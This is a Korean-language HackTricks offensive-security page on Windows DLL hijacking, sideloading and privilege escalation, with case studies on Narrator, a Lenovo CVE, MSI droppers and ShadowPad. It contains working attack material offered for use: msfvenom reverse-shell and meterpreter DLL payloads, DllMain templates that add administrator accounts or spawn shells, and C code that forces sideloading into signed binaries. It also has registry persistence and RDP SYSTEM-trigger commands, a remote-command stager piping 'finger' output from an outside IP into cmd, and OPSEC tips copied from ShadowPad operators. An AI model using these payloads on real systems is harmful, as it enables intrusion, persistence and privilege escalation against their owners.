# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

DLL Hijacking은 신뢰된 애플리케이션이 악성 DLL을 로드하도록 조작하는 기법입니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포함합니다. 주로 code execution, persistence 달성, 그리고 드물게 privilege escalation에 사용됩니다. 여기서는 권한 상승에 초점을 맞추지만, hijacking 방법은 목적에 관계없이 일관됩니다.

### 일반적인 기법

DLL hijacking에는 여러 방법이 사용되며, 각 방법의 효과는 애플리케이션의 DLL 로드 전략에 따라 달라집니다:

1. **DLL Replacement**: 정식 DLL을 악성 DLL로 교체합니다. 원본 DLL의 기능을 유지하기 위해 선택적으로 DLL Proxying을 사용할 수 있습니다.
2. **DLL Search Order Hijacking**: 악성 DLL을 정당한 DLL보다 먼저 검색되는 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 필요로 하는, 존재하지 않는 DLL로 인식하게끔 악성 DLL을 생성하여 로드되도록 합니다.
4. **DLL Redirection**: `%PATH%` 같은 검색 매개변수나 `.exe.manifest` / `.exe.local` 파일을 수정하여 애플리케이션이 악성 DLL을 가리키게 합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리에서 정식 DLL을 악성 DLL로 교체합니다. 이 방법은 종종 DLL side-loading과 연관됩니다.
6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자가 제어하는 디렉터리에 악성 DLL을 배치합니다. Binary Proxy Execution 기법과 유사합니다.

> [!TIP]
> DLL sideloading 위에 HTML staging, AES-CTR configs, .NET implants를 단계적으로 겹치는 체인(단계별 워크플로)을 보려면 아래 워크플로를 검토하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 누락된 Dll 찾기

시스템 내에서 누락된 Dll을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고, **다음 2개의 필터**를 **설정**하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그런 다음 **File System Activity**만 표시하세요:

![](<../../../images/image (153).png>)

일반적으로 **누락된 dll들**을 찾고 있다면 이 상태로 몇 **초 동안** 실행해 두면 됩니다.\
특정 실행 파일 내에서 **누락된 dll**을 찾고 있다면 **"Process Name" "contains" `<exec name>`** 같은 추가 필터를 설정한 뒤 실행하고, 이벤트 캡처를 중지하면 됩니다.

## 누락된 Dll 악용

권한을 상승시키기 위해 가장 좋은 기회는 **privilege process가 로드하려고 시도할 dll을 우리가 쓸 수 있는 위치에 작성할 수 있는 경우**입니다. 따라서, dll이 검색되는 경로들 중 **원본 dll이 있는 폴더보다 먼저 검색되는 폴더**에 dll을 쓸 수 있거나(드문 경우), 또는 dll이 검색되는 폴더에 우리가 쓸 수 있고 원본 dll이 어떤 폴더에도 존재하지 않는 상황을 만들 수 있어야 합니다.

### Dll 검색 순서

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**에서 Dll이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.**

Windows applications는 사전 정의된 검색 경로 집합을 따라 DLL을 찾으며 특정 순서를 준수합니다. 악성 DLL이 이러한 디렉터리 중 하나에 전략적으로 배치되어 정당한 DLL보다 먼저 로드되면 DLL hijacking 문제가 발생합니다. 이를 방지하려면 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 해야 합니다.

32-bit 시스템에서의 DLL 검색 순서는 아래와 같습니다:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

위는 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 이 기능이 비활성화되면 current directory가 두 번째 순위로 올라갑니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 0으로 설정하세요(기본값은 활성화됨).

만약 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH**와 함께 호출되면 검색은 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉터리에서 시작됩니다.

마지막으로, dll이 이름 대신 절대 경로로 지정되어 로드될 수도 있다는 점에 유의하세요. 이 경우 해당 dll은 **그 경로에서만** 검색됩니다(만약 그 dll에 종속성이 있으면, 그 종속성들은 이름으로 로드된 것으로 간주되어 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

신규로 생성된 프로세스의 DLL 검색 경로를 결정론적으로 조정하는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기에서 공격자가 제어하는 디렉터리를 제공하면, 대상 프로세스가 import된 DLL을 이름으로(절대 경로가 아니고 safe loading 플래그를 사용하지 않음) 해석할 때 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 파라미터를 생성하고, 공격자가 제어하는 폴더(예: dropper/unpacker가 위치한 디렉터리)를 가리키는 사용자 지정 DllPath를 제공합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 DLL을 이름으로 해석하면 로더가 이 제공된 DllPath를 참조하여 해석하므로, 악성 DLL이 대상 EXE와 동일 위치에 없더라도 신뢰할 수 있는 sideloading이 가능합니다.

참고/제한사항
- 이것은 생성되는 자식 프로세스에 영향을 미치며, 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 이름으로 DLL을 import 하거나 LoadLibrary해야 합니다(절대 경로가 아니어야 하며 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않아야 함).
- KnownDLLs와 하드코딩된 절대 경로는 hijack할 수 없습니다. forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

운영 사용 예시
- 필요한 함수를 export하거나 실제 DLL로 프록시하는 악성 xmllite.dll을 DllPath 디렉터리에 배치합니다.
- 위 기법을 사용해 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 import를 해결하고 귀하의 DLL을 sideloads합니다.

이 기법은 실제 공격에서 다단계 sideloading 체인을 유도하는 사례로 관찰되었습니다: 초기 런처가 헬퍼 DLL을 드롭하고, 그 헬퍼가 custom DllPath를 가진 Microsoft-signed, hijackable 바이너리를 실행하여 스테이징 디렉터리에서 공격자의 DLL 로드를 강제합니다.


#### Windows 문서에서의 dll 검색 순서 예외

표준 DLL 검색 순서에 대한 몇 가지 예외가 Windows 문서에 명시되어 있습니다:

- **이미 메모리에 로드된 것과 동일한 이름을 가진 DLL이** 발견되면, 시스템은 일반 검색을 우회합니다. 대신 리다이렉션과 매니페스트를 확인한 후 이미 메모리에 있는 DLL을 기본으로 사용합니다. **이 경우 시스템은 DLL을 검색하지 않습니다**.
- 해당 DLL이 현재 Windows 버전에서 **known DLL**으로 인식되는 경우, 시스템은 해당 known DLL의 버전과 그에 따른 종속 DLL들을 사용하여 **검색 과정을 생략합니다**. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 에는 이러한 known DLL 목록이 저장되어 있습니다.
- **DLL에 종속성이 있는 경우**, 이러한 종속 DLL들에 대한 검색은 초기 DLL이 전체 경로로 지정되었는지와 관계없이 마치 종속 DLL들이 **module names**으로만 지정된 것처럼 수행됩니다.

### 권한 상승

**요구사항**:

- 서로 다른 권한으로 실행되었거나 실행될 프로세스(예: horizontal 또는 lateral movement) 중 **DLL이 없는** 프로세스를 식별합니다.
- DLL이 검색될 **디렉터리**에 대해 **쓰기 권한(write access)**이 있는지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 경로 내의 디렉터리일 수 있습니다.

맞습니다, 요구 조건을 찾기는 복잡합니다 — 기본적으로 권한 있는 실행 파일이 DLL이 없는 것을 찾는 것은 **다소 이상하고**, 시스템 경로 폴더에 쓰기 권한이 있는 것은 **더욱 이상합니다**(기본적으로 불가능합니다). 하지만 잘못 구성된 환경에서는 이게 가능할 수 있습니다.\
운이 좋아 요구 조건을 충족했다면 [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해 보세요. 프로젝트의 **주된 목적이 bypass UAC** 일지라도, 해당 Windows 버전용 Dll hijacking의 **PoC**가 있어 활용할 수 있습니다(아마도 쓰기 권한이 있는 폴더 경로만 변경하면 됩니다).

폴더에서 **권한을 확인하는 방법**은 다음과 같습니다:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내부의 모든 폴더 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
executable의 imports와 dll의 exports는 다음 도구로 확인할 수도 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
쓰기 권한이 있는 **System Path folder**에서 **abuse Dll Hijacking to escalate privileges** 하는 전체 가이드는 다음을 확인하세요:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)은 시스템 PATH 내의 폴더에 대해 쓰기 권한이 있는지 확인합니다.\
이 취약점을 찾기 위한 다른 유용한 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_가 있습니다.

### 예제

익스플로잇 가능한 시나리오를 발견한 경우, 이를 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 실행 파일이 해당 DLL에서 임포트할 모든 함수를 최소한으로 export하는 DLL을 만드는 것입니다. 어쨌든, Dll Hijacking은 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** 권한 상승에 유용합니다. 실행을 위한 dll hijacking 연구에서 **유효한 DLL을 만드는 방법**의 예제를 다음에서 확인할 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, 다음 섹션에서는 템플릿으로 사용하거나 필요하지 않은 함수를 export한 DLL을 만드는 데 유용한 몇 가지 **기본 DLL 코드**를 찾을 수 있습니다.

## **DLL 생성 및 컴파일**

### **DLL 프록시화**

기본적으로 **Dll proxy**는 로드될 때 악성 코드를 실행할 수 있으며, 동시에 실제 라이브러리로의 모든 호출을 전달(relay)하여 기대한 대로 동작하고 필요한 심볼을 노출하는 DLL입니다.

도구 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus)를 사용하면 실행 파일을 지정하고 프록시할 라이브러리를 선택하여 프록시된 DLL을 생성하거나, DLL을 지정하고 프록시된 DLL을 생성할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86 — x64 버전은 보지 못함):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 직접 만든 것

다음에 유의하세요: 여러 경우에 컴파일한 Dll은 피해자 프로세스에서 로드할 여러 함수를 반드시 **여러 함수를 내보내야 합니다**. 이러한 함수들이 존재하지 않으면 **binary가 이를 로드할 수 없으며**, **exploit이 실패**합니다.

<details>
<summary>C DLL 템플릿 (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 예제 (사용자 생성 포함)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>스레드 진입점이 있는 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS 로컬라이제이션 DLL Hijack (Accessibility/ATs)

Windows Narrator.exe는 시작 시 예측 가능한 언어별 로컬라이제이션 DLL을 여전히 검색(probe)하며, 이는 hijacked되어 arbitrary code execution 및 persistence를 유발할 수 있습니다.

핵심 사실
- 탐색 경로 (현재 빌드): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 레거시 경로 (이전 빌드): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore 경로에 쓰기 가능한 공격자 제어 DLL이 존재하면 해당 DLL이 로드되고 `DllMain(DLL_PROCESS_ATTACH)`가 실행됩니다. 내보내기(exports)는 필요하지 않습니다.

Procmon으로 발견
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator를 시작하고 위 경로에 대한 로드 시도를 관찰합니다.

최소 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 단순한 hijack은 UI를 음성으로 출력하거나 강조합니다. 조용히 유지하려면 attach 시 Narrator 스레드를 열거하고, 메인 스레드를 `OpenThread(THREAD_SUSPEND_RESUME)`로 열어 `SuspendThread`로 중단시키고; 자신의 스레드에서 계속 진행하세요. 전체 코드는 PoC를 참고하세요.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정으로 Narrator를 시작하면 심어진 DLL이 로드됩니다. 보안 데스크톱(로그온 화면)에서는 CTRL+WIN+ENTER를 눌러 Narrator를 시작하면, 해당 DLL이 보안 데스크톱에서 SYSTEM으로 실행됩니다.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 호스트에 RDP로 접속한 뒤 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면, 해당 DLL이 보안 데스크톱에서 SYSTEM으로 실행됩니다.
- 실행은 RDP 세션이 닫히면 중지됩니다—inject/migrate를 신속히 수행하세요.

Bring Your Own Accessibility (BYOA)
- 내장된 Accessibility Tool(AT) 레지스트리 항목(예: CursorIndicator)을 복제한 뒤 임의의 binary/DLL을 가리키도록 편집하고 가져온 뒤 `configuration`을 해당 AT 이름으로 설정할 수 있습니다. 이렇게 하면 Accessibility 프레임워크 하에서 임의 실행을 프록시할 수 있습니다.

Notes
- `%windir%\System32`에 쓰기 및 HKLM 값을 변경하려면 관리자 권한이 필요합니다.
- 모든 페이로드 로직은 `DLL_PROCESS_ATTACH`에 둘 수 있으며, 별도의 exports는 필요하지 않습니다.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

이 사례는 Lenovo의 TrackPoint Quick Menu(`TPQMAssistant.exe`)에서의 **Phantom DLL Hijacking**을 보여주며, 이는 **CVE-2025-1729**로 추적됩니다.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe`는 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 위치합니다.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`는 매일 오전 9:30에 로그인한 사용자 컨텍스트로 실행됩니다.
- **Directory Permissions**: `CREATOR OWNER`에 의해 쓰기 가능하여 로컬 사용자가 임의의 파일을 배치할 수 있습니다.
- **DLL Search Behavior**: 작업 디렉터리에서 먼저 `hostfxr.dll`을 로드하려 시도하고, 없으면 "NAME NOT FOUND"를 기록하여 로컬 디렉터리 검색 우선순위를 나타냅니다.

### Exploit Implementation

공격자는 동일한 디렉터리에 악성 `hostfxr.dll` 스텁을 배치하여, 누락된 DLL을 악용해 사용자 컨텍스트에서 코드 실행을 얻을 수 있습니다:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 표준 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 배치합니다.
2. 현재 사용자 컨텍스트에서 예약 작업이 오전 9시 30분에 실행될 때까지 기다립니다.
3. 작업이 실행될 때 관리자가 로그인되어 있으면, 악성 DLL이 관리자 세션에서 medium integrity로 실행됩니다.
4. 표준 UAC bypass techniques를 연계하여 medium integrity에서 SYSTEM 권한으로 승격시킵니다.

## 사례 연구: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

위협 행위자는 종종 MSI 기반 dropper를 DLL side-loading과 결합하여 신뢰된 서명 프로세스 아래에서 페이로드를 실행합니다.

Chain overview
- 사용자가 MSI를 다운로드합니다. GUI 설치 중에 CustomAction이 백그라운드에서 조용히 실행되어(예: LaunchApplication 또는 VBScript action), 임베디드 리소스에서 다음 스테이지를 재구성합니다.
- dropper가 합법적이고 서명된 EXE와 악성 DLL을 동일한 디렉터리에 씁니다 (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- 서명된 EXE가 시작되면, Windows DLL search order가 작업 디렉터리에서 먼저 wsc.dll을 로드하여 서명된 부모 프로세스 아래에서 공격자 코드를 실행합니다 (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- 실행 파일이나 VBScript를 실행하는 항목을 찾습니다. 의심스러운 패턴 예: LaunchApplication이 임베디드 파일을 백그라운드에서 실행.
- Orca (Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사합니다.
- MSI CAB에 포함/분할된 페이로드:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- VBScript CustomAction에 의해 연결되어 복호화되는 여러 개의 작은 조각들을 찾습니다. 일반적인 흐름:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe를 이용한 실전 sideloading
- 다음 두 파일을 동일한 폴더에 둡니다:
- wsc_proxy.exe: 정상적으로 서명된 호스트 (Avast). 해당 프로세스는 자신의 디렉터리에서 이름으로 wsc.dll을 로드하려고 시도합니다.
- wsc.dll: attacker DLL. 특정 exports가 필요하지 않으면 DllMain으로 충분합니다; 그렇지 않으면 proxy DLL을 빌드하고 필요한 exports를 정품 라이브러리로 포워딩하면서 DllMain에서 payload를 실행하세요.
- 최소한의 DLL payload를 빌드:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 내보내기 요구사항의 경우 프록시링 프레임워크(e.g., DLLirant/Spartacus)를 사용해 전달용 DLL을 생성하고 페이로드도 실행하도록 하라.

- 이 기법은 호스트 바이너리의 DLL 이름 해석에 의존한다. 호스트가 절대 경로나 안전 로딩 플래그(e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있다.
- KnownDLLs, SxS, 그리고 forwarded exports는 우선순도에 영향을 미치므로 호스트 바이너리와 내보내기 세트를 선택할 때 고려해야 한다.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point는 Ink Dragon이 핵심 페이로드를 디스크에 암호화된 상태로 유지하면서 정식 소프트웨어에 섞이도록 ShadowPad를 **three-file triad**로 배포하는 방법을 설명했다:

1. **Signed host EXE** – AMD, Realtek, 또는 NVIDIA 같은 벤더가 악용된다 (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). 공격자는 실행파일 이름을 Windows 바이너리처럼 보이게(`conhost.exe` 등) 바꾸지만 Authenticode 서명은 유효하게 남는다.
2. **Malicious loader DLL** – EXE 옆에 예상 이름으로 드랍된다 (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). 해당 DLL은 보통 ScatterBrain 프레임워크로 난독화된 MFC 바이너리이며, 역할은 암호화된 블랍을 찾아 복호화하고 ShadowPad를 reflective map 하는 것이다.
3. **Encrypted payload blob** – 흔히 동일 디렉토리에 `<name>.tmp`로 저장된다. 복호화된 페이로드를 메모리 매핑한 후 로더는 포렌식 증거를 없애기 위해 TMP 파일을 삭제한다.

운영 참고사항:

* Signed EXE의 이름을 바꾸되 PE 헤더의 원래 `OriginalFileName`을 유지하면 Windows 바이너리로 가장하면서도 벤더 서명을 유지할 수 있으므로, Ink Dragon이 AMD/NVIDIA 유틸리티인 바이너리를 `conhost.exe`처럼 보이게 드롭하던 관행을 모방하라.
* 실행파일이 신뢰된 상태로 남기 때문에 대부분의 allowlisting 제어는 악성 DLL이 그 옆에 위치하는 것만으로 충분하다. loader DLL 커스터마이징에 집중하라; 서명된 상위 프로세스는 보통 수정 없이 실행 가능하다.
* ShadowPad의 복호화기는 TMP 블랍이 로더 옆에 존재하고 쓰기 가능하길 기대하며, 매핑 후 파일을 0으로 덮어쓴다. 페이로드가 로드될 때까지 디렉토리를 쓰기 가능 상태로 유지하라; 메모리에 올라간 이후에는 TMP 파일을 OPSEC 상 안전하게 삭제할 수 있다.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

운영자는 DLL sideloading을 LOLBAS와 결합해 디스크 상의 유일한 커스텀 아티팩트를 신뢰된 EXE 옆의 악성 DLL로만 남긴다:

- **Remote command loader (Finger):** Hidden PowerShell이 `cmd.exe /c`를 기동해 Finger 서버에서 명령을 가져와 `cmd`로 파이프한다:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`는 TCP/79의 텍스트를 가져오고; `| cmd`는 서버 응답을 실행하므로 운영자는 서버측에서 세컨드 스테이지를 교체할 수 있다.

- **Built-in download/extract:** 악성 확장자가 아닌 무해한 확장자를 가진 아카이브를 다운로드해 풀고, sideload 대상과 DLL을 무작위 `%LocalAppData%` 폴더 아래에 준비한다:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`은 진행 표시를 숨기고 리디렉션을 따른다; `tar -xf`는 Windows 내장 tar를 사용한다.

- **WMI/CIM launch:** EXE를 WMI로 시작하면 텔레메트리는 CIM에 의해 생성된 프로세스로 표시되며, colocated DLL을 로드한다:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- 로컬 DLL을 선호하는 바이너리(e.g., `intelbq.exe`, `nearby_share.exe`)에서 동작하며; 페이로드(e.g., Remcos)는 신뢰된 이름으로 실행된다.

